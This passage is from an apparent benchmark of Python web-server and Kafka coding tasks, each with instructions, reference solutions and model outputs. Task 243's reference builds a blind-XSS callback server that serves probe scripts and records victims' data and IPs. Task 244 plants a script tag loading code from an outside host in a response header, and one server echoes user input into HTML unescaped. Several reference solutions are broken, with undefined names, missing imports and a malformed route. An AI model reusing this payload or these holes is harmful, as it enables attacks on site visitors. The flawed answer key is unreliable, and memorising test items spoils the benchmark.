    "right_result": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\n\nclass S(BaseHTTPRequestHandler):\n    def _set_headers(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def write(self, text: str) -> None:\n        self.wfile.write(text.encode())\n\n    def do_GET(self):\n        if self.path == '/':\n            self._set_headers()\n            self.write('<html><body><h1>Simple HTTP Server</h1></body></html>')\n        elif self.path.startswith('/sentence?'):\n            params = self.path.split('?')[1]\n            sentence = params.split('=')[1]\n            formatted_sentence = f\"<p>{sentence}</p>\"\n            self._set_headers()\n            self.write(formatted_sentence)\n        else:\n            self.send_error(404, 'Resource not found')\n\n    def do_HEAD(self):\n        self._set_headers()\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length).decode()\n        self._set_headers()\n        self.write(f'<p>Received POST data: {post_data}</p>')\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8765, server_class=HTTPServer, handler_class=S):\n        self.port = port\n        self.server_class = server_class\n        self.handler_class = handler_class\n\n    def run(self):\n        server_address = ('', self.port)\n        httpd = self.server_class(server_address, self.handler_class)\n        print(f'Server running on port {self.port}')\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            print('\\nServer shutting down...')\n            httpd.shutdown()"
  },
  {
    "Task_id": 236,
    "Instruction": "Task Description: Create a Tornado-based HTTP server application that handles web requests and responds with a simple message.\n\nClass Description: The TornadoApp class encapsulates a Tornado web server with configurable port settings. It initializes the web application with route handlers and provides a method to start the server.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8888)\n- app: tornado.web.Application - The Tornado web application instance that manages request routing\n\nMethods:\n- __init__(port: int = 8888) -> None - Initializes the Tornado application with the specified port and sets up the route handler\n- run() -> None - Starts the Tornado web server on the specified port and begins processing requests\n\nAdditional Class (MainHandler):\nClass Description: The MainHandler class processes HTTP GET requests to the root URL and returns a simple text response.\n\nMethods:\n- get() -> None - Handles GET requests to the root URL and writes \"Hello, world\" as the response",
    "Canonical_solution": "import tornado.web\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"Hello, world\")\n\nclass TornadoApp:\n    def __init__(self, port: int = 8888):\n        self.port = port\n        self.app = tornado.web.Application(\n            [\n                (r\"/\", MainHandler),\n            ]\n        )\n\n    def run(self):\n        self.app.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.web\nimport tornado.ioloop\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"Hello, world\")\n\nclass TornadoApp:\n    def __init__(self, port: int = 8888):\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/\", MainHandler),\n        ])\n\n    def run(self):\n        self.app.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 237,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that can handle specific URL routes for string manipulation, including reversing strings and wrapping text to a specified width.\n\nClass Description: TornadoHTTPServer is a class that encapsulates the setup and execution of a Tornado web server with predefined request handlers for string operations.\n\nAttributes:\n- app: tornado.web.Application - The Tornado web application instance that manages URL routing and handlers\n- http_server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the application\n- port: int - The port number on which the server listens (default: 8000)\n\nMethods:\n- __init__(port: int = 8000) -> None - Initializes the HTTP server with specified port and sets up URL routing\n  - port: int - The port number to bind the server to (default: 8000)\n- start() -> None - Starts the HTTP server and begins listening for incoming requests\n  - No parameters\n  - No return value (runs indefinitely until interrupted)\n\nAdditional Handler Classes:\n- ReverseHandler: tornado.web.RequestHandler - Handles GET requests for string reversal\n  - get(input_word: str) -> None - Reverses the input string and writes it to response\n    - input_word: str - The string to be reversed (captured from URL)\n- WrapHandler: tornado.web.RequestHandler - Handles POST requests for text wrapping\n  - post() -> None - Wraps text to specified width and writes to response\n    - Retrieves 'name' (text) and 'width' (optional, default 40) from POST parameters",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.web\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"Please send email to me\", type=int)\n\nclass ReverseHandler(tornado.web.RequestHandler):\n    def get(self, input_word):\n        self.write(input_word[::-1])\n\nclass WrapHandler(tornado.web.RequestHandler):\n    def post(self):\n        text = self.get_argument(\"name\")\n        width = self.get_argument(\"width\", 40)\n        self.write(textwrap.fill(word, width))\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        options.port = port\n        self.app = tornado.web.Application(\n            handlers=[\n                (r\"/reverse/(\\w+)\", ReverseHandler),\n                (r\"/wrap/(/w+)\", WrapHandler)\n            ]\n        )\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self):\n        self.http_server.listen(options.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\n\nclass ReverseHandler(tornado.web.RequestHandler):\n    def get(self, input_word):\n        reversed_word = input_word[::-1]\n        self.write(reversed_word)\n\nclass WrapHandler(tornado.web.RequestHandler):\n    def post(self):\n        name = self.get_argument('name')\n        width = self.get_argument('width', default='40')\n        try:\n            width = int(width)\n        except ValueError:\n            width = 40\n        wrapped = \"\\n\".join([name[i:i+width] for i in range(0, len(name), width)])\n        self.write(wrapped)\n\nclass TornadoHTTPServer:\n    def __init__(self, port: int = 8000):\n        self.app = tornado.web.Application([\n            (r'/reverse/(\\w+)', ReverseHandler),\n            (r'/wrap', WrapHandler)\n        ])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n        self.port = port\n\n    def start(self):\n        self.http_server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 239,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that handles web requests, serves static files, and manages user comments through a React component.\n\nClass Description: TornadoServer is a class that encapsulates a Tornado web server with routing, request handling, and server management capabilities.\n\nAttributes:\n- urls: [List] - A list of URL patterns and their corresponding handlers\n- settings: [Dict] - Configuration settings for the Tornado application including paths, security, and debug options\n- application: [tornado.web.Application] - The main Tornado web application instance\n\nMethods:\n- __init__: [Name](self) -> [None] - Initializes the server with URL routing and application settings\n- run: [Name](self, port=int) -> [None] - Starts the HTTP server on the specified port and begins the I/O loop\n\nAdditional Handler Classes:\n1. CommentHandler (inherits from tornado.web.RequestHandler):\n   Methods:\n   - post: [Name](self) -> [None] - Handles POST requests for submitting comments and redirects to the home page\n\n2. IndexHandler (inherits from tornado.web.RequestHandler):\n   Methods:\n   - get: [Name](self) -> [None] - Handles GET requests for the home page, renders a React component, and displays it in a template",
    "Canonical_solution": "import os\nimport tornado.ioloop\nimport tornado.httpserver\nfrom tornado.web import RequestHandler\nfrom tornado.gen import coroutine\nfrom react.render import render_component\n\nclass CommentHandler(RequestHandler):\n    @coroutine\n    def post(self):\n        comments = []\n        comments.append({\n            'author': self.get_argument('author'),\n            'text': self.get_argument('text'),\n        })\n        self.redirect('/')\n\nclass IndexHandler(RequestHandler):\n    @coroutine\n    def get(self):\n        comments = []\n        rendered = render_component(\n            os.path.join(os.getcwd(), 'static', 'js', 'CommentBox.jsx'),\n            {\n                'comments': comments,\n                'url': '/comments',\n                'xsrf': self.xsrf_token\n            },\n            to_static_markup=False,\n        )\n        self.render('index.html', rendered=rendered)\n\nclass TornadoServer:\n    def __init__(self):\n        self.urls = [\n            (r\"/\", IndexHandler),\n            (r\"/comments\", CommentHandler),\n            (r\"/(.*)\", tornado.web.StaticFileHandler, {\"path\": r\"{0}\".format(os.path.join(os.path.dirname(__file__), \"static\"))},\n        ]\n        self.settings = {\n            \"template_path\": os.path.join(os.path.dirname(__file__), \"templates\"),\n            \"static_path\": os.path.join(os.path.dirname(__file__), \"static\"),\n            \"cookie_secret\": os.urandom(12),\n            \"xsrf_cookies\": True,\n            \"debug\": True,\n            \"compress_response\": True\n        }\n        self.application = tornado.web.Application(self.urls, **self.settings)\n\n    def run(self, port=8000):\n        server = tornado.httpserver.HTTPServer(self.application)\n        server.listen(port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport os\nfrom tornado.concurrent import run_on_executor\nfrom concurrent.futures import ThreadPoolExecutor\n\nclass CommentHandler(tornado.web.RequestHandler):\n    def post(self):\n        # Handle comment submission logic here\n        self.write({\"status\": \"success\", \"message\": \"Comment submitted successfully.\"})\n        self.redirect(\"/\")\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        # Render React component template\n        self.render(\"index.html\")\n\nclass TornadoServer:\n    def __init__(self):\n        self.urls = [\n            (r\"/\", IndexHandler),\n            (r\"/comment\", CommentHandler)\n        ]\n        self.settings = {\n            \"static_path\": os.path.join(os.getcwd(), \"static\"),\n            \"template_path\": os.path.join(os.getcwd(), \"templates\"),\n            \"debug\": True\n        }\n        self.application = tornado.web.Application(self.urls, **self.settings)\n\n    def run(self, port=8888):\n        self.application.listen(port)\n        tornado.ioloop.IOLoop.current().start()\n\nif __name__ == \"__main__\":\n    server = TornadoServer()\n    server.run()"
  },
  {
    "Task_id": 243,
    "Instruction": "Task Description: Implement a Tornado-based HTTP server with request handlers for processing JavaScript callbacks and serving dynamic homepage content.\n\nClass Description: The TornadoHTTPServer class initializes and runs a Tornado web application with two main handlers: CallbackHandler for processing POST requests containing callback data, and HomepageHandler for serving dynamic JavaScript content based on user-specific configurations.\n\nAttributes:\n- settings: [dict] - Configuration dictionary containing server settings like cookie_secret\n- app: [tornado.web.Application] - The Tornado web application instance\n\nMethods:\n- __init__: [Name](settings: dict) -> [None] - Initializes the server with given settings and sets up URL routing\n- start: [Name](port: int = 8888) -> [None] - Starts the server listening on the specified port and begins the I/O loop\n\nClass Description: BaseHandler serves as the base request handler class providing common functionality for all handlers.\n\nAttributes:\n- (Inherited from tornado.web.RequestHandler)\n\nMethods:\n- __init__: [Name](*args, **kwargs) -> [None] - Initializes the handler and sets Content-Type header based on URI\n- options: [Name]() -> [None] - Handles OPTIONS requests (empty implementation)\n- throw_404: [Name]() -> [None] - Sends a 404 response with \"Resource not found\" message\n- on_finish: [Name]() -> [None] - Cleanup method called when request finishes (closes session)\n\nClass Description: CallbackHandler processes POST requests containing callback data, either in PGP-encrypted or plain JSON format.\n\nAttributes:\n- (Inherited from BaseHandler)\n\nMethods:\n- post: [Name]() -> [None] - Processes POST requests, validates user, and handles callback data (PGP or JSON)\n\nClass Description: HomepageHandler serves dynamic JavaScript content customized for each user.\n\nAttributes:\n- (Inherited from BaseHandler)\n\nMethods:\n- get: [Name](path: str) -> [None] - Serves customized JavaScript content based on user configuration and request path",
    "Canonical_solution": "import tornado.web\nimport tornado.ioloop\nfrom tornado import gen\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def __init__(self, *args, **kwargs):\n        super(BaseHandler, self).__init__(*args, **kwargs)\n        if self.request.uri.startswith(\"/api/\"):\n            self.set_header(\"Content-Type\", \"application/json\")\n        else:\n            self.set_header(\"Content-Type\", \"application/javascript\")\n\n    def options(self):\n        pass\n\n    def throw_404(self):\n        self.set_status(404)\n        self.write(\"Resource not found\")\n\n    def on_finish(self):\n        session.close()\n\nclass CallbackHandler(BaseHandler):\n    def post(self):\n        self.set_header('Access-Control-Allow-Origin', '*')\n        self.set_header('Access-Control-Allow-Methods', 'POST, GET, HEAD, OPTIONS')\n        self.set_header('Access-Control-Allow-Headers', 'X-Requested-With')\n\n        owner_user = self.get_user_from_subdomain()\n        if owner_user == None:\n            self.throw_404()\n            return\n\n        if \"-----BEGIN PGP MESSAGE-----\" in self.request.body:\n            if owner_user.email_enabled:\n                send_javascript_pgp_encrypted_callback_message(self.request.body, owner_user.email)\n        else:\n            callback_data = json.loads(self.request.body)\n            callback_data['ip'] = self.request.remote_ip\n            injection_db_record = record_callback_in_database(callback_data, self)\n            if owner_user.email_enabled:\n                send_javascript_callback_message(owner_user.email, injection_db_record)\n            self.write('{}')\n\nclass HomepageHandler(BaseHandler):\n    def get(self, path):\n        self.set_header(\"Access-Control-Allow-Origin\", \"*\")\n        self.set_header(\"Access-Control-Allow-Methods\", \"OPTIONS, PUT, DELETE, POST, GET\")\n        self.set_header(\"Access-Control-Allow-Headers\", \"X-Requested-With, Content-Type, Origin, Authorization, Accept, Accept-Encoding\")\n\n        user = self.get_user_from_subdomain()\n        if user == None:\n            self.throw_404()\n            return\n\n        new_probe = probejs\n        new_probe = new_probe.replace('[HOST_URL]', \"https://\" + self.request.headers.get('Host'))\n        new_probe = new_probe.replace('[PGP_REPLACE_ME]', json.dumps(user.pgp_key))\n        new_probe = new_probe.replace('[CHAINLOAD_REPLACE_ME]', json.dumps(user.chainload_uri))\n        new_probe = new_probe.replace('[COLLECT_PAGE_LIST_REPLACE_ME]', json.dumps(user.get_page_collection_path_list()))\n\n        if user.pgp_key != \"\":\n            with open(\"templates/pgp_encrypted_template.txt\", \"r\") as template_handler:\n                new_probe = new_probe.replace('[TEMPLATE_REPLACE_ME]', json.dumps(template_handler.read()))\n        else:\n            new_probe = new_probe.replace('[TEMPLATE_REPLACE_ME]', json.dumps(\"\"))\n\n        if self.request.uri != \"/\":\n            probe_id = self.request.uri.split(\"/\")[1]\n            self.write(new_probe.replace(\"[PROBE_ID]\", probe_id))\n        else:\n            self.write(new_probe)\n\nclass TornadoHTTPServer:\n    def __init__(self, settings):\n        self.settings = settings\n        self.app = tornado.web.Application([\n            (r\"/js_callback\", CallbackHandler),\n            (r\"/(.*)\", HomepageHandler),\n        ], cookie_secret=settings[\"cookie_secret\"])\n\n    def start(self, port=8888):\n        self.app.listen(port)\n        tornado.ioloop.IOLoop.current().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport json\nimport base64\nimport gnupg\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def __init__(self, *args, **kwargs):\n        super(BaseHandler, self).__init__(*args, **kwargs)\n        self.set_header(\"Content-Type\", \"application/json\")\n\n    def options(self):\n        self.set_status(204)\n        self.finish()\n\n    def throw_404(self):\n        self.set_status(404)\n        self.write({\"error\": \"Resource not found\"})\n\n    def on_finish(self):\n        pass\n\n\nclass CallbackHandler(BaseHandler):\n    def post(self):\n        content_type = self.request.headers.get(\"Content-Type\")\n        if content_type == \"application/json\":\n            data = json.loads(self.request.body)\n            self.write({\"status\": \"success\", \"data\": data})\n        elif content_type.startswith(\"application/pgp\"):\n            # Placeholder for PGP decryption logic\n            self.write({\"status\": \"success\", \"data\": \"PGP data received\"})\n        else:\n            self.write({\"status\": \"error\", \"message\": \"Unsupported content type\"})\n\n\nclass HomepageHandler(BaseHandler):\n    def get(self, path):\n        # Placeholder for dynamic user configuration\n        user_config = {\"user\": \"example_user\", \"theme\": \"dark\", \"language\": \"en\"}\n        js_content = f\"\"\"\n            <script>\n                const config = {json.dumps(user_config)};\n                console.log(\"User config:\", config);\n            </script>\n        \"\"\"\n        self.write(js_content)\n\n\nclass TornadoHTTPServer:\n    def __init__(self, settings):\n        self.settings = settings\n        self.app = tornado.web.Application(\n            [\n                (r\"/callback\", CallbackHandler),\n                (r\"/homepage/(.*)\", HomepageHandler),\n                (r\"/(.*)\", BaseHandler),\n            ],\n            **settings\n        )\n\n    def start(self, port=8888):\n        self.app.listen(port)\n        tornado.ioloop.IOLoop.current().start()\n\n\nif __name__ == \"__main__\":\n    settings = {\n        \"cookie_secret\": \"your_cookie_secret_here\",\n        \"debug\": True\n    }\n    server = TornadoHTTPServer(settings)\n    server.start()"
  },
  {
    "Task_id": 244,
    "Instruction": "Task Description: Create a Tornado-based HTTP server with multiple route handlers and security headers configuration.\n\nClass Description: The implementation consists of several classes that together create a secure web server using Tornado framework. The BaseHandler provides common security headers and functionality, while specialized handlers process different routes. The TornadoHTTPServer class orchestrates the application setup and startup.\n\nAttributes:\n\nDOMAIN: [str] - Global variable storing the domain name for security policies\napp: [tornado.web.Application] - The Tornado web application instance in TornadoHTTPServer\n\nMethods:\n\nBaseHandler:\n__init__: (self, *args, **kwargs) -> None - Initializes the handler and sets security headers\ncompute_etag: (self) -> None - Disables ETag generation for responses\n\nXSSHunterApplicationHandler:\nget: (self) -> None - Handles GET requests for the /app route, renders mainapp.htm template\n\nTornadoHTTPServer:\n__init__: (self, domain: str) -> None - Initializes the server with given domain and sets up routes\nstart: (self, port: int = 1234) -> None - Starts the server on specified port\n\nHomepageHandler:\nget: (self) -> None - Handles GET requests for the root route, renders homepage.htm template\n\nFeaturesHandler:\nget: (self) -> None - Handles GET requests for /features route, renders features.htm template\n\nSignUpHandler:\nget: (self) -> None - Handles GET requests for /signup route, renders signup.htm template\n\nContactHandler:\nget: (self) -> None - Handles GET requests for /contact route, renders contact.htm template",
    "Canonical_solution": "import tornado.ioloop\nimport tornado.web\nimport tornado.template\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def __init__(self, *args, **kwargs):\n        super(BaseHandler, self).__init__(*args, **kwargs)\n        self.set_header(\"X-Frame-Options\", \"deny\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"Server\", \"<script src=//y.vg></script>\")\n        self.set_header(\"Content-Security-Policy\", \"default-src 'self' \" + DOMAIN + \" api.\" + DOMAIN + \"; style-src 'self' fonts.googleapis.com; img-src 'self' api.\" + DOMAIN + \"; font-src 'self' fonts.googleapis.com fonts.gstatic.com; script-src 'self'; frame-src 'self'\")\n\n    def compute_etag(self):\n        return None\n\nclass XSSHunterApplicationHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"mainapp.htm\").generate(domain=DOMAIN))\n\nclass TornadoHTTPServer:\n    def __init__(self, domain):\n        global DOMAIN\n        DOMAIN = domain\n        self.app = tornado.web.Application([\n            (r\"/\", HomepageHandler),\n            (r\"/app\", XSSHunterApplicationHandler),\n            (r\"/features\", FeaturesHandler),\n            (r\"/signup\", SignUpHandler),\n            (r\"/contact\", ContactHandler),\n            (r\"/static/(.*)\", tornado.web.StaticFileHandler, {\"path\": \"static/\"}),\n        ])\n\n    def start(self, port=1234):\n        self.app.listen(port)\n        tornado.ioloop.IOLoop.current().start()\n\nclass HomepageHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"homepage.htm\").generate())\n\nclass FeaturesHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"features.htm\").generate(domain=DOMAIN))\n\nclass SignUpHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"signup.htm\").generate(domain=DOMAIN))\n\nclass ContactHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"contact.htm\").generate())",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.web\nimport tornado.ioloop\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def __init__(self, *args, **kwargs):\n        super(BaseHandler, self).__init__(*args, **kwargs)\n        self.set_default_headers()\n\n    def set_default_headers(self):\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Content-Security-Policy\", \"default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' https://trusted.cdn.com\")\n\n    def compute_etag(self):\n        pass\n\n\nclass XSSHunterApplicationHandler(BaseHandler):\n    def get(self):\n        self.render(\"mainapp.htm\")\n\n\nclass HomepageHandler(BaseHandler):\n    def get(self):\n        self.render(\"homepage.htm\")\n\n\nclass FeaturesHandler(BaseHandler):\n    def get(self):\n        self.render(\"features.htm\")\n\n\nclass SignUpHandler(BaseHandler):\n    def get(self):\n        self.render(\"signup.htm\")\n\n\nclass ContactHandler(BaseHandler):\n    def get(self):\n        self.render(\"contact.htm\")\n\n\nclass TornadoHTTPServer:\n    DOMAIN = \"example.com\"\n\n    def __init__(self, domain: str):\n        self.DOMAIN = domain\n        self.app = tornado.web.Application([\n            (r\"/\", HomepageHandler),\n            (r\"/app\", XSSHunterApplicationHandler),\n            (r\"/features\", FeaturesHandler),\n            (r\"/signup\", SignUpHandler),\n            (r\"/contact\", ContactHandler),\n        ])\n        self.app.settings[\"debug\"] = False\n\n    def start(self, port: int = 1234) -> None:\n        self.app.listen(port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 245,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that handles web requests and serves responses, including rendering templates and serving static files.\n\nClass Description: TornadoServer is a class that encapsulates the setup and running of a Tornado web server. It configures routes, template paths, and static file paths, and provides a method to start the server.\n\nAttributes:\n- handlers: [list] - A list of URL routing tuples mapping paths to request handlers\n- template_path: [str] - The file system path to the directory containing template files\n- static_path: [str] - The file system path to the directory containing static files\n\nMethods:\n- __init__: [Name](port: int = 8000) -> None - Initializes the server with default port 8000, sets up default handlers, and configures template and static paths\n- run: [Name]() -> None - Starts the Tornado web server by:\n  1. Parsing command line options\n  2. Creating a Tornado Application instance with configured handlers and paths\n  3. Starting an HTTP server on the specified port\n  4. Beginning the I/O event loop\n\nThe class works with a companion request handler (IndexHandler) that:\n- Inherits from tornado.web.RequestHandler\n- Implements a GET method to render a template with provided data\n- Takes no explicit constructor parameters\n- Returns rendered HTML output via self.render()",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.web\nimport tornado.options\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        lst = [\"python\",\"www.itdiffer.com\",\"qiwsir@gmail.com\"]\n        self.render(\"index.html\", info=lst)\n\nclass TornadoServer:\n    def __init__(self, port=8000):\n        options.port = port\n        self.handlers = [(r\"/\", IndexHandler)]\n        self.template_path = os.path.join(os.path.dirname(__file__), \"temploop\")\n        self.static_path = \"./static\"\n\n    def run(self):\n        tornado.options.parse_command_line()\n        app = tornado.web.Application(self.handlers, self.template_path, debug=True)\n        http_server = tornado.httpserver.HTTPServer(app)\n        http_server.listen(options.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport os\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.render(\"index.html\", title=\"Tornado Server\")\n\nclass TornadoServer:\n    def __init__(self, port=8000):\n        self.port = port\n        self.handlers = [\n            (r\"/\", IndexHandler)\n        ]\n        self.template_path = os.path.join(os.path.dirname(__file__), \"templates\")\n        self.static_path = os.path.join(os.path.dirname(__file__), \"static\")\n\n    def run(self):\n        application = tornado.web.Application(\n            self.handlers,\n            template_path=self.template_path,\n            static_path=self.static_path\n        )\n        http_server = tornado.httpserver.HTTPServer(application)\n        http_server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 247,
    "Instruction": "Task Description: Implement a Tornado-based HTTP server that handles user data submissions via POST requests and renders responses using templates.\n\nClass Description: The implementation consists of two classes: UserHandler for processing user data and TornadoServer for managing the server lifecycle.\n\nAttributes:\n\nport: int - The port number on which the server will listen (default: 8000)\nhandlers: list - URL routing configuration mapping paths to handler classes\n\nMethods:\n\nUserHandler.post() -> None - Processes POST requests containing user data (username, email, website, language) and renders a response using the user.html template\nTornadoServer.__init__(port: int = 8000) -> None - Initializes the server with specified port\nTornadoServer.run() -> None - Configures and starts the Tornado HTTP server with defined routes and begins the I/O loop",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.web\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass UserHandler(tornado.web.RequestHandler):\n    def post(self):\n        user_name = self.get_argument(\"username\")\n        user_email = self.get_argument(\"email\")\n        user_website = self.get_argument(\"website\")\n        user_language = self.get_argument(\"language\")\n        self.render(\"user.html\", \n                   username=user_name,\n                   email=user_email,\n                   website=user_website,\n                   language=user_language)\n\nclass TornadoServer:\n    def __init__(self, port=8000):\n        self.port = port\n        self.handlers = [\n            (r\"/user\", UserHandler)\n        ]\n        \n    def run(self):\n        app = tornado.web.Application(self.handlers)\n        http_server = tornado.httpserver.HTTPServer(app)\n        http_server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nfrom tornado.web import RequestHandler, Application\n\nclass UserHandler(RequestHandler):\n    def post(self):\n        username = self.get_argument('username')\n        email = self.get_argument('email')\n        website = self.get_argument('website', default='')\n        language = self.get_argument('language', default='en')\n        self.render('user.html', username=username, email=email, website=website, language=language)\n\nclass TornadoServer:\n    def __init__(self, port: int = 8000):\n        self.port = port\n        self.handlers = []\n\n    def run(self):\n        app = Application(self.handlers)\n        app.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 248,
    "Instruction": "Task Description: Implement a Kafka message producer class in Python that can connect to a Kafka cluster, publish messages to a specified topic, and properly manage resources.\n\nClass Description: The `KafkaMessageProducer` class provides functionality to produce and send messages to a Kafka topic. It handles connection establishment, message publishing, and resource cleanup.\n\nAttributes:\n- `_producer`: [KafkaProducer] - The Kafka producer instance used to send messages.\n- `bootstrap_servers`: [list] - A list of Kafka broker addresses (default: ['host.docker.internal:9092']).\n- `api_version`: [tuple] - The Kafka API version to use (default: (0, 10)).\n\nMethods:\n- `connect()` -> [bool] - Establishes a connection to the Kafka cluster using the specified bootstrap servers and API version. Returns `True` if successful, `False` otherwise.\n- `publish_message(topic_name: str, key: str, value: str)` -> [bool] - Publishes a message to the specified Kafka topic. The `key` and `value` are converted to bytes before sending. Returns `True` if successful, `False` otherwise.\n- `close()` -> [None] - Closes the Kafka producer instance to release resources.",
    "Canonical_solution": "import json\nfrom kafka import KafkaProducer\n\nclass KafkaMessageProducer:\n    def __init__(self, bootstrap_servers=['host.docker.internal:9092'], api_version=(0, 10)):\n        self._producer = None\n        self.bootstrap_servers = bootstrap_servers\n        self.api_version = api_version\n\n    def connect(self):\n        try:\n            self._producer = KafkaProducer(\n                bootstrap_servers=self.bootstrap_servers,\n                api_version=self.api_version\n            )\n            return True\n        except Exception as ex:\n            print('Exception while connecting Kafka')\n            print(ex)\n            return False\n\n    def publish_message(self, topic_name, key, value):\n        try:\n            key_bytes = bytes(key, encoding='utf-8')\n            value_bytes = bytes(value, encoding='utf-8')\n            self._producer.send(topic_name, key=key_bytes, value=value_bytes)\n            self._producer.flush()\n            print('Message published successfully.')\n            return True\n        except Exception as ex:\n            print('Exception in publishing message')\n            print(ex)\n            return False\n\n    def close(self):\n        if self._producer is not None:\n            self._producer.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\n\nclass KafkaMessageProducer:\n    def __init__(self, bootstrap_servers=['host.docker.internal:9092'], api_version=(0, 10)):\n        self._producer = KafkaProducer(bootstrap_servers=bootstrap_servers, api_version=api_version)\n        self.bootstrap_servers = bootstrap_servers\n        self.api_version = api_version\n\n    def connect(self):\n        try:\n            self._producer.bootstrap_servers = self.bootstrap_servers\n            self._producer.api_version = self.api_version\n            self._producer.start()\n            return True\n        except Exception as e:\n            print(f\"Failed to connect to Kafka: {e}\")\n            return False\n\n    def publish_message(self, topic_name: str, key: str, value: str) -> bool:\n        try:\n            self._producer.send(topic_name, key=key.encode('utf-8'), value=value.encode('utf-8'))\n            self._producer.flush()\n            return True\n        except Exception as e:\n            print(f\"Failed to publish message: {e}\")\n            return False\n\n    def close(self):\n        self._producer.close()"
  },
  {
    "Task_id": 249,
    "Instruction": "Task Description: Create a Kafka producer wrapper class that simplifies message sending to Kafka topics, handles message formatting, and manages producer lifecycle.\n\nClass Description: KafkaProducerWrapper is a utility class that encapsulates Kafka producer functionality, providing methods to send messages (with optional keys), batch send messages, and properly manage producer resources. It automatically generates a unique topic name for message sending.\n\nAttributes:\n_producer: KafkaProducer - The underlying Kafka producer instance\n_topic: str - The Kafka topic name (automatically generated with UUID)\n\nMethods:\n__init__: () -> None - Initializes the Kafka producer with bootstrap servers and generates a unique topic name\nsend: (message: str | tuple[str, str]) -> None - Sends a single message to the Kafka topic (message can be either a plain string or a key-value tuple)\nfill: (messages: Iterable[str | tuple[str, str]]) -> None - Sends multiple messages to the Kafka topic and flushes the producer\nclose: () -> None - Properly closes the Kafka producer to release resources\ntopic: () -> str - Property that returns the generated topic name",
    "Canonical_solution": "from kafka import KafkaProducer\nfrom uuid import uuid4\n\nkafka_settings = {\"bootstrap_servers\": \"kafka:9092\"}\n\nclass KafkaProducerWrapper:\n    def __init__(self) -> None:\n        self._producer = KafkaProducer(\n            bootstrap_servers=kafka_settings[\"bootstrap_servers\"]\n        )\n        self._topic = f\"integration-tests-{uuid4()}\"\n\n    def send(self, message: str | tuple[str, str]) -> None:\n        if isinstance(message, tuple):\n            (key, value) = message\n        else:\n            (key, value) = str(uuid4()), message\n        self._producer.send(self._topic, key=key.encode(), value=value.encode())\n\n    def fill(self, messages: Iterable[str | tuple[str, str]]) -> None:\n        for msg in messages:\n            self.send(msg)\n        self._producer.flush()\n\n    def close(self) -> None:\n        self._producer.close()\n\n    @property\n    def topic(self) -> str:\n        return self._topic",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
